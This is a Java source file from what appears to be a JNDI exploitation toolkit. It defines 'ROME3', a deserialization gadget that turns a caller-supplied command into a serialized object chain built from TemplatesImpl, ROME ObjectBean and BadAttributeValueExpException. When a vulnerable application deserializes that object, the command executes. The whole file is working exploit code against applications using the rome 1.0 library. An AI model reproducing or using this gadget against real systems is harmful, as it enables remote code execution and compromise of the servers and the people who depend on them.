package com.qi4l.jndi.gadgets;

import com.qi4l.jndi.gadgets.annotation.Authors;
import com.qi4l.jndi.gadgets.annotation.Dependencies;
import com.qi4l.jndi.gadgets.utils.Gadgets;
import com.qi4l.jndi.gadgets.utils.Reflections;
import com.sun.syndication.feed.impl.ObjectBean;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;

@Authors({"Firebasky"})
@Dependencies("rome:rome:1.0")
public class ROME3 implements ObjectPayload<Object>{
    @Override
    public Object getObject(String command) throws Exception {
        Object                        o        = Gadgets.createTemplatesImpl(command);
        ObjectBean delegate = new ObjectBean(Templates.class, o);
        BadAttributeValueExpException b        = new BadAttributeValueExpException("");
        Reflections.setFieldValue(b, "val", delegate);
        return b;
    }
}
